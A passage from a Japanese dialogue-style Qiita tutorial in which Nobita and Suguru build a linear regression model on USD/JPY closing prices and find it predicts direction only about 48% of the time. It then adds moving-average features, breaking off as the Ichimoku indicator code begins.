<p><a href="https://camo.qiitausercontent.com/e8462b398c917662b5ec97d538e4950ae4ace3a3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f38393732336339312d646463342d656230632d636433312d6131613038613364663931352e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e8462b398c917662b5ec97d538e4950ae4ace3a3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f38393732336339312d646463342d656230632d636433312d6131613038613364663931352e6a706567" alt="nobitaFX3_8.JPG" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/89723c91-ddc4-eb0c-cd31-a1a08a3df915.jpeg"></a></p>

<p>つぎに、読み込んだデータをNumPyの形式に変換するよ。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># pandasのDataFrameのままでは、扱いにくい+実行速度が遅いので、numpyに変換して処理します</span>
<span class="n">data2</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</pre></div></div>

<p>どうして、numpyに変換するの？</p>

<p>pandasはデータ形式としては扱いやすいけど、数値計算が遅いし、有効桁数も少ないからだよ。<br>
numpyは数値計算に適したデータ形式なんだ。</p>

<p>次に説明変数$X$を作成するよ。<br>
Xは、行ごとに、当日から24日前までの終値を列方向に並べた25列の行列になるよ。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 説明変数となる行列Xを作成します</span>
<span class="n">day_ago</span> <span class="o">=</span> <span class="mi">25</span> <span class="c1"># 何日前までのデータを使用するのかを設定</span>
<span class="n">num_sihyou</span> <span class="o">=</span> <span class="mi">1</span> <span class="c1"># 終値</span>

<span class="n">X</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span> <span class="n">day_ago</span><span class="o">*</span><span class="n">num_sihyou</span><span class="p">))</span> 

<span class="c1"># 終値をfor文でday_ago日前まで一気に追加する</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">day_ago</span><span class="p">):</span>
    <span class="n">X</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data2</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">)</span><span class="o">-</span><span class="n">i</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span>
</pre></div></div>

<p>なんだか、難しいfor文でよく分からないよ。<br>
何をしているの？</p>

<p>data2の列4は当日終値だよ。<br>
これは過去25日分のデータを横向きに並べているんだよ。<br>
一度Xをpandasに戻して、中身を見てみようか。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># Xの確認です</span>
<span class="n">data_show</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">X</span><span class="p">)</span>
<span class="n">data_show</span>
</pre></div></div>

<p><a href="https://camo.qiitausercontent.com/a77c9ed3908ec75469ef673467564c325489b980/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f37333363313265652d616631302d303463392d616337612d3039623065616234663064612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a77c9ed3908ec75469ef673467564c325489b980/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f37333363313265652d616631302d303463392d616337612d3039623065616234663064612e706e67" alt="nobitaFX_3_1.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/733c12ee-af10-04c9-ac7a-09b0eab4f0da.png"></a></p>

<p>当日の終値が、1行下の翌日には、1日前の終値に入っているんだね。<br>
なるほど。<br>
分かった。じゃあ、同じように目的変数（被説明変数）$Y$も作成してみるよ。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 被説明変数となる Y = pre_day後の終値-当日終値 を作成します</span>
<span class="n">Y</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">))</span>

<span class="c1"># 何日後を値段の差を予測するのか決めます</span>
<span class="n">pre_day</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">Y</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">Y</span><span class="p">)</span><span class="o">-</span><span class="n">pre_day</span><span class="p">]</span> <span class="o">=</span> <span class="n">X</span><span class="p">[</span><span class="n">pre_day</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">),</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">X</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="o">-</span><span class="n">pre_day</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span>
</pre></div></div>

<p>うん、のび太くん、OKだ。良い感じだね。<br>
ここから重要ポイントに入るね。<br>
データを「正規化」するよ。</p>

<p>正規化？</p>

<p>正規化にもいろいろあるけど、一般には、各データに対して、平均を引き算し、標準偏差で割って<br>
平均0、標準偏差1になるように変換することだよ。</p>

<p>う～ん、難しい話だね。</p>

<p>要は、1ドル110円台のときのデータも、100円台のときのデータも同じように扱えるようにしたいんだよ。<br>
ただ、FXの為替データの場合は、個人的には標準偏差で割らないほうが良いと感じている。</p>

<p>どうして？</p>

<p>標準偏差のような変動の上下幅の大きさは、為替では重要な情報になるからだよ。</p>

<p>よく分からないや・・・<br>
とりあえず、平均を引き算するんだね。<br>
よしコードを書いてみるよ。</p>

<p>いやここは難しいから、僕が書こう。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 【重要】X, Yを正規化します</span>
<span class="n">original_X</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="n">X</span><span class="p">)</span> <span class="c1"># コピーするときは、そのままイコールではダメ</span>
<span class="n">tmp_mean</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">))</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">day_ago</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">)):</span>
    <span class="n">tmp_mean</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">original_X</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">day_ago</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">])</span> <span class="c1"># 25日分の平均値</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">X</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span> 
        <span class="n">X</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span> <span class="o">-</span> <span class="n">tmp_mean</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="c1"># Xを正規化</span>
    <span class="n">Y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span>  <span class="n">Y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>  <span class="c1"># X同士の引き算しているので、Yはそのまま</span>
</pre></div></div>

<p>ただ、引き算するだけなのに、なんかややこしいね。<br>
np.copy(X)って何？</p>

<p>numpyは単純に<br>
original_X = X<br>
ってしてしまうと、Xが変化したときに、original_Xも変化してしまうんだよ。<br>
それを避けるために、np.copyを使っているよ。</p>

<p>どうしてoriginal_Xまで変わるの？</p>

<p>numpyはポインタ参照で値を受け渡すからだよ。</p>

<p>うん、難しいや。<br>
とりあえず、単純に = で変数をコピーできないことは分かったよ。<br>
正規化で$Y$はそのままなんだね。</p>

<p>$Y$は$X$の引き算になっているから、平均値を引く操作はそこでキャンセルされるからだよ。</p>

<p>この正規化しだいで、予測の性能が大きく変わるから、とても重要なんだよ。</p>

<p>さて、次に$X$と$Y$を学習データとテストデータに分けてみようか。<br>
ここはのび太くん、書いてくれるかな。<br>
ただし、最初のほうは使わないで、行200から使ってくれるかな。</p>

<p>うん、えーと・・・<br>
カタカタ・・・</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># XとYを学習データとテストデータ(2017年～)に分ける</span>
<span class="n">X_train</span> <span class="o">=</span> <span class="n">X</span><span class="p">[</span><span class="mi">200</span><span class="p">:</span><span class="mi">5193</span><span class="p">,:]</span> <span class="c1"># 次のプログラムで200日平均を使うので、それ以降を学習データに使用します</span>
<span class="n">Y_train</span> <span class="o">=</span> <span class="n">Y</span><span class="p">[</span><span class="mi">200</span><span class="p">:</span><span class="mi">5193</span><span class="p">]</span> 

<span class="n">X_test</span> <span class="o">=</span> <span class="n">X</span><span class="p">[</span><span class="mi">5193</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="o">-</span><span class="n">pre_day</span><span class="p">,:]</span> 
<span class="n">Y_test</span> <span class="o">=</span> <span class="n">Y</span><span class="p">[</span><span class="mi">5193</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">Y</span><span class="p">)</span><span class="o">-</span><span class="n">pre_day</span><span class="p">]</span>
</pre></div></div>

<p>OKだよ。のび太くん。<br>
行5193からが2017年だからね。</p>

<p>でも、どうして行200からを使用したの？</p>

<p>これはちょっと先を見越しての話だから、とりあえず保留でいいかな。</p>

<p>怪しいな～。分かったよ。<br>
学習データとテストデータができたら、前回の線形回帰の練習問題と同じだね。<br>
前と同じようにやってみるよ。<br>
<a href="https://qiita.com/sugulu/items/b6f891e060beab94b99b">第2話：のび太、線形回帰を学ぶ</a></p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 学習データを使用して、線形回帰モデルを作成します</span>
<span class="kn">from</span> <span class="nn">sklearn</span> <span class="kn">import</span> <span class="n">linear_model</span> <span class="c1"># scikit-learnライブラリの関数を使用します</span>
<span class="n">linear_reg_model</span> <span class="o">=</span> <span class="n">linear_model</span><span class="o">.</span><span class="n">LinearRegression</span><span class="p">()</span>

<span class="n">linear_reg_model</span><span class="o">.</span><span class="n">fit</span><span class="p">(</span><span class="n">X_train</span><span class="p">,</span> <span class="n">Y_train</span><span class="p">)</span> <span class="c1"># モデルに対して、学習データをフィットさせ係数を学習させます</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"回帰式モデルの係数"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">linear_reg_model</span><span class="o">.</span><span class="n">intercept_</span><span class="p">)</span> 
<span class="k">print</span><span class="p">(</span><span class="n">linear_reg_model</span><span class="o">.</span><span class="n">coef_</span><span class="p">)</span> 
</pre></div></div>

<p>のび太くん、OKだよ。<br>
じゃあテストデータで予測してみよう。<br>
前回のコードに加えて、予測の正答率も計算してくれるかな。</p>

<p>えっと、<br>
カタカタ・・・</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 2017年のデータで予想し、グラフで予測具合を見る</span>

<span class="n">Y_pred</span> <span class="o">=</span> <span class="n">linear_reg_model</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">X_test</span><span class="p">)</span> <span class="c1"># 予測する</span>

<span class="n">result</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">Y_pred</span><span class="p">)</span> <span class="c1"># 予測</span>
<span class="n">result</span><span class="o">.</span><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'Y_pred'</span><span class="p">]</span>
<span class="n">result</span><span class="p">[</span><span class="s1">'Y_test'</span><span class="p">]</span> <span class="o">=</span> <span class="n">Y_test</span>

<span class="n">sns</span><span class="o">.</span><span class="n">set_style</span><span class="p">(</span><span class="s1">'darkgrid'</span><span class="p">)</span> 
<span class="n">sns</span><span class="o">.</span><span class="n">regplot</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="s1">'Y_pred'</span><span class="p">,</span> <span class="n">y</span><span class="o">=</span><span class="s1">'Y_test'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">result</span><span class="p">)</span> <span class="c1">#plotする</span>


<span class="c1"># 正答率を計算</span>
<span class="n">success_num</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">Y_pred</span><span class="p">)):</span>
    <span class="k">if</span> <span class="n">Y_pred</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">*</span> <span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span><span class="mi">0</span><span class="p">:</span>
        <span class="n">success_num</span><span class="o">+=</span><span class="mi">1</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"予測日数："</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">Y_pred</span><span class="p">))</span><span class="o">+</span><span class="s2">"、正答日数："</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">success_num</span><span class="p">)</span><span class="o">+</span><span class="s2">"正答率："</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">success_num</span><span class="o">/</span><span class="nb">len</span><span class="p">(</span><span class="n">Y_pred</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span><span class="p">))</span>
</pre></div></div>

<p>予測日数：214、正答日数：103、正答率：48.13084112149533</p>

<p><a href="https://camo.qiitausercontent.com/7c63de60a2264603fcd26e2dec4c84f17d8d36d0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f65353865393838312d626337622d656535382d623337652d6365633135633636353865612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/7c63de60a2264603fcd26e2dec4c84f17d8d36d0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f65353865393838312d626337622d656535382d623337652d6365633135633636353865612e706e67" alt="nobitaFX_3_2.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/e58e9881-bc7b-ee58-b37e-cec15c6658ea.png"></a></p>

<p>あれ、前回と違って、近似直線の周りに薄い青の塗りが出てきたよ。</p>

<p>これは、regplotでデータ数が多いと、自動で95%範囲を表示してくれるんだよ。</p>

<p>95%範囲？</p>

<p>近似直線は95%の確率でこの薄い青色範囲内にありますよってことを示している。<br>
正答率を見ると、48%だから、適当に上がるか下がるかを予測した場合（50%）とほぼ変わらないね。<br>
テスト期間（2017年1月初日から10月末まで）の予測結果の合計と変化を見てみようか。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 2017年の予測結果の合計を計算ーーーーーーーーー</span>
<span class="c1"># 前々日終値に比べて前日終値が高い場合は、買いとする</span>
<span class="n">sum_2017</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">Y_test</span><span class="p">)):</span> <span class="c1"># len()で要素数を取得しています</span>
    <span class="k">if</span> <span class="n">Y_pred</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">sum_2017</span> <span class="o">+=</span> <span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">sum_2017</span> <span class="o">-=</span> <span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"2017年の利益合計：</span><span class="si">%1.3lf</span><span class="s2">"</span> <span class="o">%</span><span class="n">sum_2017</span><span class="p">)</span> 


<span class="c1"># 予測結果の総和グラフを描くーーーーーーーーー</span>
<span class="n">total_return</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">Y_test</span><span class="p">))</span>

<span class="k">if</span> <span class="n">Y_pred</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span><span class="mi">0</span><span class="p">:</span> <span class="c1"># 2017年の初日を格納</span>
    <span class="n">total_return</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">total_return</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)):</span> <span class="c1"># 2017年の2日以降を格納</span>
    <span class="k">if</span> <span class="n">Y_pred</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span><span class="mi">0</span><span class="p">:</span>
        <span class="n">total_return</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">total_return</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">total_return</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">total_return</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">Y_test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="n">plt</span><span class="o">.</span><span class="n">plot</span><span class="p">(</span><span class="n">total_return</span><span class="p">)</span>
</pre></div></div>

<p>2017年の利益合計：0.245</p>

<p><a href="https://camo.qiitausercontent.com/69eccfe1005b535647b837cea5f5646964e2f6fa/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f64616461653134612d653336652d393836392d313861372d3434383438643365333462302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/69eccfe1005b535647b837cea5f5646964e2f6fa/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f64616461653134612d653336652d393836392d313861372d3434383438643365333462302e706e67" alt="nobitaFX_3_3.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/dadae14a-e36e-9869-18a7-44848d3e34b0.png"></a></p>

<p>すぐるさん、0.245って少しプラスになったけど、だめだ～。<br>
グラフを見ると、50日目くらいで14まで増えたのに、後半すごい減っているよ・・・</p>

<p>そうだね。<br>
正答率も48%だし、やっぱりうまくいっていないね。</p>

<p>って！！すぐるさん、教えてくれるって言ったじゃないか！</p>

<p>あとちょっとだよ、のび太くん。<br>
どうしてうまくいかないのか、考えるんだ。</p>

<p>・<br>
・<br>
・</p>

<h2>
<span id="実装その2" class="fragment"></span><a href="#%E5%AE%9F%E8%A3%85%E3%81%9D%E3%81%AE2"><i class="fa fa-link"></i></a>実装その2</h2>

<p>う～ん・・・<br>
分からないよ。</p>

<p>そうだね。一緒に考えてみようか。<br>
機械学習の性能は、</p>

<p>(機械学習の性能) = (入力データ) × (モデルの表現力)　</p>

<p>で概念的に表されるよ。</p>

<p>今回は線形モデルというとても単純なモデルを使用しているから、（モデルの表現力）がとても低いんだ。<br>
例えば、最近はやりのディープラーニングの場合は（モデルの表現力）が高いから、入力データが単純でも良い予測ができる。</p>

<p>ってことは、線形モデルは（モデルの表現力）が低いから、もっと良い入力データを入れれば良くなるってこと？</p>

<p>単純にそうとは言い切れないけど、多くの場合はその通りだよ、のび太くん。</p>

<p>でも、これ以上何を入力データに加えればよいんだろう・・・？<br>
分からないよ。</p>

<p>そうだね。いろいろな選択肢があるけど、<br>
FXで頻繁に使用されるテクニカル指標を使うのが良いよ。<br>
なぜならそのテクニカル指標を使って多くの人が判断しているから、将来の為替の結果に影響するんだ。</p>

<p>どんなテクニカル指標があるの？</p>

<p>いろいろあるけど、今回は移動平均線と一目均衡表、ボリンジャーバンドの3種類を使用しよう。</p>

<p>移動平均線は一定期間のただの平均だよ。<br>
一目均衡表は期間内の最高値と最安値を使った指標だよ。<br>
ボリンジャーバンドは一定期間の標準偏差を使った指標だよ。</p>

<p>今回追加するテクニカル指標のパラメータには代表的な数値を使用しよう。<br>
FXのお話ではなく、機械学習のお話だから、詳しくは自分で調べてみてね。<br>
<a href="https://www.gaitameonline.com/academy_chart.jsp" rel="nofollow noopener" target="_blank">例えば: 外為オンラインのFX実戦チャート術ページ</a></p>

<p>よし、これらを加えたプログラムに修正してみよう。</p>

<p>修正コードも僕のGitHubにおいて置くね。<br>
<a href="https://github.com/Nobita-FX/Nobita-FX/blob/master/program/NobitaFX_3_linear_regression_2.ipynb" rel="nofollow noopener" target="_blank">本記事の掲載コードはこちら</a></p>

<p>まず、5日の移動平均線を追加しよう。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 5日移動平均を追加します</span>
<span class="n">data2</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">c_</span><span class="p">[</span><span class="n">data2</span><span class="p">,</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span><span class="mi">1</span><span class="p">))]</span> <span class="c1"># 列の追加</span>
<span class="n">ave_day</span> <span class="o">=</span> <span class="mi">5</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">ave_day</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">)):</span>
    <span class="n">tmp</span> <span class="o">=</span><span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">ave_day</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float</span><span class="p">)</span> <span class="c1"># pythonは0番目からindexが始まります</span>
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
</pre></div></div>

<p>pythonはスライスといって、行列の要素を 0 : i みたいにindexで指定したときと、ダイレクトにindexの i って指定したときで、挙動が異なるから、気をつけてね。</p>

<p>例えば以下のプログラムの出力は</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="n">x</span> <span class="o">=</span> <span class="p">[</span><span class="mi">10</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">50</span><span class="p">]</span>
<span class="n">i</span><span class="o">=</span><span class="mi">4</span>
<span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">i</span><span class="p">])</span>
<span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</pre></div></div>

<p>[10, 20, 30, 40]<br>
50</p>

<p>ってなるよ。</p>

<p>指標を作るときに未来の情報がXに入っちゃうと、予測できて当然になるから気をつけてね。<br>
同じように25, 75, 200日の移動平均線を追加してみて。</p>

<p>うん、カタカタ・・・</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 25日移動平均を追加します</span>
<span class="n">data2</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">c_</span><span class="p">[</span><span class="n">data2</span><span class="p">,</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span><span class="mi">1</span><span class="p">))]</span>
<span class="n">ave_day</span> <span class="o">=</span> <span class="mi">25</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">ave_day</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">)):</span>
    <span class="n">tmp</span> <span class="o">=</span><span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">ave_day</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float</span><span class="p">)</span>
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>

<span class="c1"># 75日移動平均を追加します</span>
<span class="n">data2</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">c_</span><span class="p">[</span><span class="n">data2</span><span class="p">,</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span><span class="mi">1</span><span class="p">))]</span> <span class="c1"># 列の追加</span>
<span class="n">ave_day</span> <span class="o">=</span> <span class="mi">75</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">ave_day</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">)):</span>
    <span class="n">tmp</span> <span class="o">=</span><span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">ave_day</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float</span><span class="p">)</span>
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>

<span class="c1"># 200日移動平均を追加します</span>
<span class="n">data2</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">c_</span><span class="p">[</span><span class="n">data2</span><span class="p">,</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">),</span><span class="mi">1</span><span class="p">))]</span> <span class="c1"># 列の追加</span>
<span class="n">ave_day</span> <span class="o">=</span> <span class="mi">200</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">ave_day</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data2</span><span class="p">)):</span>
    <span class="n">tmp</span> <span class="o">=</span><span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="n">ave_day</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float</span><span class="p">)</span>
    <span class="n">data2</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
</pre></div></div>

<p>次は一目均衡表とボリンジャーバンドを足すね。<br>
ここは僕が書こう</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 一目均衡表を追加します (9,26, 52) </span>
<span class="n">para1</span> <span class="o">=</span><span class="mi">9</span>
<span class="n">para2</span> <span class="o">=</span> <span class="mi">26</span>
<span class="n">para3</span> <span class="o">=</span> <span class="mi">52</span>

